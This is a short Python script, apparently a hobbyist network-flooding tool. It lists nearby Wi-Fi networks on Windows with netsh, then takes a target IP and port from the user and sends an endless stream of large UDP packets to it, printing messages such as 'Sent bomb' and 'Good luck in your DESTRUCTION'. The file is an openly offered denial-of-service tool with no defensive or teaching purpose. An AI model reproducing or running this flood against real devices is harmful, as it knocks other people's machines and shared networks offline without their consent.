import subprocess
import socket
import time

# Function to scan for available Wi-Fi networks using netsh (Windows)
def scan_wifi_networks():
    networks = []
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'networks'], stdout=subprocess.PIPE, text=True)
        output = result.stdout.splitlines()
        for line in output:
            if "SSID" in line:
                ssid = line.split(":")[1].strip()
                if ssid:
                    networks.append(ssid)
                    print(f"Network found: {ssid}")
    except Exception as e:
        print(f"Failed to scan networks: {e}")
    
    if not networks:
        print("No networks found.")
    return networks

# Function to send UDP packets to a specified IP and port
def send_packets(ip, port):
    bytes_data = [bytes(9999) for _ in range(35)]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        while True:
            for data_chunk in bytes_data:
                try:
                    sock.sendto(data_chunk, (ip, port))
                    print(f"Sent bomb to {ip}:{port}")
                except OSError as e:
                    print(f"Failed to send data: {e}")
                    break
                time.sleep(0.05)  # Reduced sleep time to increase frequency of sends
    except KeyboardInterrupt:
        print("Stopping the BOMB sending.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
    finally:
        sock.close()

# Scan for Wi-Fi networks
networks = scan_wifi_networks()

if networks:
    ip = input("Enter the IP of the device on the Wi-Fi network: ")
    port = input("Port: ")
    try:
        port = int(port)
        socket.inet_aton(ip)  # Check if IP is valid
        print("Good luck in your DESTRUCTION")
        send_packets(ip, port)
    except (ValueError, socket.error):
        print("Invalid IP address or port. Exiting...")
else:
    print("No Wi-Fi networks found. Exiting...")
